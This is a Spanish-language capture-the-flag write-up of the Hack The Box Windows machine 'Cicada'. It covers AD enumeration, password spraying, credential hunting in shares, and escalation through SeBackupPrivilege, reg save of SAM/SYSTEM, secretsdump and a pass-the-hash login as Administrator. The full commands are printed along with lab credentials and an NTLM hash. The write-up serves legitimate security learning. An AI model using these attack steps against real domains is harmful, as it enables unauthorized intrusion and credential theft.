---
title: Cicada
description: Cicada es una máquina Windows de nivel fácil que se centra en la enumeración y explotación de Active Directory para principiantes. En esta máquina, los jugadores enumerarán el dominio, identificarán usuarios, navegarán por recursos compartidos, descubrirán contraseñas en texto plano almacenadas en archivos, ejecutarán un password spray y usarán SeBackupPrivilege para lograr un compromiso total del sistema.
date: 2024-10-06
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-cicada/cicada_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - windows
  - hack_the_box
  - tcp
  - dns
  - rpc
  - smb
  - sid_enum
  - kerberos
  - ldap
  - winrm
  - active_directory
  - password_spraying
  - sebackupprivilege_abuse
  - pass_the_hash
  - hash_dumping
  - reg_abuse
  - information_gathering
  - active_directory_enumeration
  - active_directory_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```
/home/kali/Documents/htb/machines/cicada:-$ ping -c 1 10.10.11.35     
PING 10.10.11.35 (10.10.11.35) 56(84) bytes of data.
64 bytes from 10.10.11.35: icmp_seq=1 ttl=127 time=374 ms

--- 10.10.11.35 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 374.247/374.247/374.247/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ sudo nmap -p- -sS --min-rate 5000 -open -vvv -n -Pn 10.10.11.35 -oG nmap1
Host: 10.10.11.35 ()    Status: Up
Host: 10.10.11.35 ()    Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 60280/open/tcp/////        Ignored State: filtered (65522)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ sudo nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,60280 -vvv 10.10.11.35 -oN nmap2
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-02-22 22:51:08Z)
135/tcp   open  msrpc?        syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  tcpwrapped    syn-ack ttl 127
636/tcp   open  tcpwrapped    syn-ack ttl 127
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
3268/tcp  open  tcpwrapped    syn-ack ttl 127
3269/tcp  open  tcpwrapped    syn-ack ttl 127
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Issuer: commonName=CICADA-DC-CA/domainComponent=cicada
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-22T20:24:16
| Not valid after:  2025-08-22T20:24:16
| MD5:   9ec5:1a23:40ef:b5b8:3d2c:39d8:447d:db65
| SHA-1: 2c93:6d7b:cfd8:11b9:9f71:1a5a:155d:88d3:4a52:157a
| -----BEGIN CERTIFICATE-----
| MIIF4DCCBMigAwIBAgITHgAAAAOY38QFU4GSRAABAAAAAzANBgkqhkiG9w0BAQsF
| ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGY2ljYWRh
| MRUwEwYDVQQDEwxDSUNBREEtREMtQ0EwHhcNMjQwODIyMjAyNDE2WhcNMjUwODIy
| MjAyNDE2WjAfMR0wGwYDVQQDExRDSUNBREEtREMuY2ljYWRhLmh0YjCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOatZznJ1Zy5E8fVFsDWtq531KAmTyX8
| BxPdIVefG1jKHLYTvSsQLVDuv02+p29iH9vnqYvIzSiFWilKCFBxtfOpyvCaEQua
| NaJqv3quymk/pw0xMfSLMuN5emPJ5yHtC7cantY51mSDrvXBxMVIf23JUKgbhqSc
| Srdh8fhL8XKgZXVjHmQZVn4ONg2vJP2tu7P1KkXXj7Mdry9GFEIpLdDa749PLy7x
| o1yw8CloMMtcFKwVaJHy7tMgwU5PVbFBeUhhKhQ8jBR3OBaMBtqIzIAJ092LNysy
| 4W6q8iWFc+Tb43gFP4nfb1Xvp5mJ2pStqCeZlneiL7Be0SqdDhljB4ECAwEAAaOC
| Au4wggLqMC8GCSsGAQQBgjcUAgQiHiAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8A
| bABsAGUAcjAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwEwDgYDVR0PAQH/
| BAQDAgWgMHgGCSqGSIb3DQEJDwRrMGkwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3
| DQMEAgIAgDALBglghkgBZQMEASowCwYJYIZIAWUDBAEtMAsGCWCGSAFlAwQBAjAL
| BglghkgBZQMEAQUwBwYFKw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAY5YMN7
| Sb0WV8GpzydFLPC+751AMB8GA1UdIwQYMBaAFIgPuAt1+B1uRE3nh16Q6gSBkTzp
| MIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NOPUNJQ0FEQS1EQy1D
| QSxDTj1DSUNBREEtREMsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2Vz
| LENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2ljYWRhLERDPWh0Yj9j
| ZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlz
| dHJpYnV0aW9uUG9pbnQwgb0GCCsGAQUFBwEBBIGwMIGtMIGqBggrBgEFBQcwAoaB
| nWxkYXA6Ly8vQ049Q0lDQURBLURDLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
| MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWNpY2Fk
| YSxEQz1odGI/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmlj
| YXRpb25BdXRob3JpdHkwQAYDVR0RBDkwN6AfBgkrBgEEAYI3GQGgEgQQ0dpG4APi
| HkGYUf0NXWYT14IUQ0lDQURBLURDLmNpY2FkYS5odGIwDQYJKoZIhvcNAQELBQAD
| ggEBAIrY4wzebzUMnbrfpkvGA715ds8pNq06CN4/24q0YmowD+XSR/OI0En8Z9LE
| eytwBsFZJk5qv9yY+WL4Ubb4chKSsNjuc5SzaHxXAVczpNlH/a4WAKfVMU2D6nOb
| xxqE1cVIcOyN4b3WUhRNltauw81EUTa4xT0WElw8FevodHlBXiUPUT9zrBhnvNkz
| obX8oU3zyMO89QwxsusZ0TLiT/EREW6N44J+ROTUzdJwcFNRl+oLsiK5z/ltLRmT
| P/gFJvqMFfK4x4/ftmQV5M3hb0rzUcS4NJCGtclEoxlJHRTDTG6yZleuHvKSN4JF
| ji6zxYOoOznp6JlmbakLb1ZRLA8=
|_-----END CERTIFICATE-----
5985/tcp  open  tcpwrapped    syn-ack ttl 127
60280/tcp open  tcpwrapped    syn-ack ttl 127
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 43674/tcp): CLEAN (Timeout)
|   Check 2 (port 62546/tcp): CLEAN (Timeout)
|   Check 3 (port 62917/udp): CLEAN (Timeout)
|   Check 4 (port 57183/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time: 
|   date: 2025-02-22T22:52:14
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
```
```terminal
/home/kali/Documents/htb/machines/cicada:-$ echo '10.10.11.35\tcicada.htb\tcicada-dc.cicada.htb' | sudo tee -a /etc/hosts
```

---
## Active Directory Enumeration

Inicio la enumeración del servicio SMB en la máquina víctima. Utilizo crackmapexec para obtener información sobre el sistema.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ crackmapexec smb 10.10.11.35
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
```

Comienzo comprobando si un usuario anónimo puede acceder a recursos compartidos.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ crackmapexec smb 10.10.11.35 --shares
SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    CICADA-DC        [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

Al intentar enumerar los recursos compartidos sin especificar un usuario, se me deniega el acceso. Por ello, utilizo kerbrute para enumerar usuarios válidos predeterminados en el entorno de Active Directory.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ /home/kali/Documents/github/kerbrute/kerbrute_linux_amd64 userenum -d cicada --dc 10.10.11.35 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

![](assets/img/htb-writeup-cicada/cicada1_1.png)

Con esta enumeración, identifico que los usuarios `guest@cicada.htb` y `administrator@cicada.htb` son válidos. Utilizo el usuario predeterminado `guest` para enumerar los recursos compartidos.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ smbmap -u guest -p '' -H 10.10.11.35
```

![](assets/img/htb-writeup-cicada/cicada1_2.png)

Investigo el recurso `HR` que es accesible y encuentro un archivo de texto.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ smbclient /\\10.10.11.35/\HR -U guest
```

![](assets/img/htb-writeup-cicada/cicada1_3.png)

```terminal
smb: \> get "Notice from HR.txt"

/home/kali/Documents/htb/machines/cicada:-$ cat 'Notice from HR.txt'
```

![](assets/img/htb-writeup-cicada/cicada1_4.png)

De esta forma, descubro una contraseña `Cicada$M6Corpb*@Lp#nZp!8` que podría estar siendo utilizada por algún usuario del entorno.

---
## Active Directory Exploitation

Usando nxc puedo enumerar los usuarios del dominio que son de tipo SidTypeUser.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ sudo nxc smb 10.10.11.35 -u 'guest' -p '' --rid-brute | grep SidTypeUser
SMB         10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)
```

```terminal
/home/kali/Documents/htb/machines/cicada:-$  echo 'Administrator\nGuest\nkrbtgt\nCICADA-DC$\njohn.smoulder\nsarah.dantelia\nmichael.wrightson\ndavid.orelious\nemily.oscars' > valid_users1.txt
```

Con kerbrute verifique la validez de estos usuarios.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ /home/kali/Documents/github/kerbrute/kerbrute_linux_amd64 userenum -d cicada --dc 10.10.11.35 valid_users1.txt
```

![](assets/img/htb-writeup-cicada/cicada2_1.png)

```terminal
/home/kali/Documents/htb/machines/cicada:-$ echo 'Guest@cicada\nsarah.dantelia@cicada\nAdministrator@cicada\njohn.smoulder@cicada\nCICADA-DC$@cicada\ndavid.orelious@cicada\nmichael.wrightson@cicada\nemily.oscars@cicada' > valid_users2.txt
```

Ahora, procedo a realizar un password spray para verificar si alguno de estos usuarios sigue utilizando la contraseña que encontré.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ sudo nxc smb 10.10.11.35 -u valid_users2.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success
SMB         10.10.11.35     445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
SMB         10.10.11.35     445    NONE             [-] \Guest@cicada:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    NONE             [-] \sarah.dantelia@cicada:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    NONE             [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.10.11.35     445    NONE             [-] \john.smoulder@cicada:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    NONE             [-] \CICADA-DC$@cicada:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.10.11.35     445    NONE             [-] \david.orelious@cicada:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE                                
SMB         10.10.11.35     445    NONE             [+] \michael.wrightson@cicada:Cicada$M6Corpb*@Lp#nZp!8                                                  
SMB         10.10.11.35     445    NONE             [-] \emily.oscars@cicada:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```

![](assets/img/htb-writeup-cicada/cicada2_2.png)

Identifico que el usuario `michael.wrightson` sigue utilizando la contraseña encontrada anteriormente.

---

Verifico los accesos compartidos que el usuario `michael.wrightson` puede leer en el servidor SMB, pero no encuentro informacion util.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ smbmap -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' -H 10.10.11.35
```

![](assets/img/htb-writeup-cicada/cicada3_1.png)

Luego, recolecté información del dominio con ldapdomaindump, utilizando las credenciales obtenidas.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ ldapdomaindump ldap://10.10.11.35 -u 'cicada.htb\michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

De esta manera, encuentro las credenciales del usuario `david.orelious`.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ open domain_users.html
```

![](assets/img/htb-writeup-cicada/cicada3_2.png)

---

Con las credenciales de `david.orelious`, verifico a qué recursos compartidos tiene acceso.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ smbmap -u david.orelious -p 'aRt$Lp#7t*VQ!3' -H 10.10.11.35
```

![](assets/img/htb-writeup-cicada/cicada4_1.png)

accedo al recurso compartido `DEV` utilizando smbclient.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ smbclient /\\10.10.11.35/\DEV -U david.orelious
Password for [WORKGROUP\david.orelious]: aRt$Lp#7t*VQ!3
```

![](assets/img/htb-writeup-cicada/cicada4_2.png)

Dentro de `DEV`, encuentro y descargo el archivo `Backup_script.ps1`.

```terminal
smb: \> get Backup_script.ps1

/home/kali/Documents/htb/machines/cicada:-$ cat Backup_script.ps1
```

![](assets/img/htb-writeup-cicada/cicada4_3.png)

Al examinar el contenido del script, descubro que establece las credenciales para el usuario `emily.oscars`:`Q!3@Lp#M6b*7t*Vt`.`

---

Revisó si este usuario puede conectarse a la máquina víctima a través del servicio WinRM.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ crackmapexec winrm 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
SMB         10.10.11.35     5985   CICADA-DC        [*] Windows Server 2022 Build 20348 (name:CICADA-DC) (domain:cicada.htb)
HTTP        10.10.11.35     5985   CICADA-DC        [*] http://10.10.11.35:5985/wsman
WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:Q!3@Lp#M6b*7t*Vt (Pwn3d!)
```

Las credenciales son correctas y puedo ejecutar comandos remotamente mediante WinRM.

Una vez conectado, accedo al archivo que contiene la flag.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami
cicada\emily.oscars

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA> type Desktop\user.txt
```

---
## Privilege Escalation

Verificó los privilegios asignados a la cuenta de `Emily`.

```terminal
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> whoami /priv
```

![](assets/img/htb-writeup-cicada/cicada6_1.png)

El resultado muestra que tengo habilitado el privilegio SeBackupPrivilege. Este privilegio permite leer archivos y directorios sin restricciones, lo que incluye la capacidad de copiar archivos críticos del sistema, como los archivos SAM y SYSTEM que contienen credenciales y otros datos sensibles.

Normalmente, SeBackupPrivilege se utiliza en programas de respaldo para poder acceder a archivos protegidos. Sin embargo, si se concede a un usuario no autorizado, puede explotarse para extraer información sensible y facilitar la escalada de privilegios.

Para obtener más detalles sobre cómo se puede explotar este privilegio, consultar el siguiente recurso: [Windows Local Privilege Escalation Cookbook - SeBackupPrivilege](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md#exploitation).

* Copiar los archivos `sam hive` y `system hive` de `HKLM` a `C:\temp`.

```terminal
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\sam C:\temp\sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\system C:\temp\system.hive
The operation completed successfully.
```

* Descargo ambos archivos a mi máquina.

```terminal
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> download C:\temp\system.hive
Info: Downloading C:\temp\system.hive to system.hive
Info: Download successful!

*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> download C:\temp\sam.hive
Info: Downloading C:\temp\sam.hive to sam.hive
Info: Download successful!
```

* Uso la herramienta impacket-secretsdump para extraer los hashes NTLM.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

![](assets/img/htb-writeup-cicada/cicada6_2.png)

En la salida, encuentro el hash NTLM del usuario `Administrator`:`2b87e7c93a3e8a0ea4a581937016f341`

Con este hash, puedo iniciar sesión directamente en la cuenta de `Administrator` utilizando Evil-WinRM.

```terminal
/home/kali/Documents/htb/machines/cicada:-$ evil-winrm -i 10.10.11.35 -u 'Administrator' -H '2b87e7c93a3e8a0ea4a581937016f341'
```
```terminal
*Evil-WinRM* PS C:\Users\Administrator> type Desktop\root.txt
```

> <a href="https://labs.hackthebox.com/achievement/machine/1521382/627" target="_blank">***Litio7 has successfully solved Cicada from Hack The Box***</a>
{: .prompt-info style="text-align:center" }
